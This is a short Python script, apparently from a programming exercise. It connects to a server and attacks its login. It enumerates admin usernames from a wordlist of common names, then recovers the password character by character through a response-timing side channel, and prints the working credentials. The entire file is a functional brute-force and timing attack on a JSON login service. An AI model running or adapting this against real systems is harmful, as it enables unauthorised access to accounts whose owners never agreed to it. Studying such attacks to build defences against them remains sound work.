import sys
import socket
from datetime import datetime
import string
import json


args = sys.argv
local_name = args[1]
port = int(args[2])
address = (local_name, port)
admin_logins = ['admin', 'Admin', 'admin1', 'admin2', 'admin3', 'user1', 'user2', 'root', 'default',
                'new_user', 'some_user', 'new_admin', 'administrator', 'Administrator', 'superuser',
                'super', 'su', 'alex', 'suser', 'rootuser', 'adminadmin', 'useruser', 'superadmin',
                'username', 'username1']

password_letters = list(string.ascii_uppercase) + list(string.ascii_lowercase) + list(string.digits)

number_of_letters = 1

with socket.socket() as my_socket:
    my_socket.connect(address)
    response = 'nothing'
    admin_login = ""
    right_password = ""

    for login in admin_logins:
        py_dict = {"login": login.strip(), "password": " "}
        j_string = json.dumps(py_dict)
        my_socket.send(j_string.encode())

        response = my_socket.recv(4096)

        response = json.loads(response.decode())
        if response["result"] == 'Wrong password!':
            admin_login = login
            break

    while True:
        for letter in password_letters:
            password = right_password + letter

            py_dict = {"login": admin_login, "password": password}
            j_string = json.dumps(py_dict)

            my_socket.send(j_string.encode())
            start1 = datetime.now()
            response = my_socket.recv(4096)
            finish1 = datetime.now()
            difference1 = finish1 - start1
            response = json.loads(response.decode())
            response = response["result"]

            if difference1.total_seconds() >= 0.1:
                right_password += letter
                break

            elif response == "Connection success!":
                break

        if response == "Connection success!":
            break


print(json.dumps(py_dict))
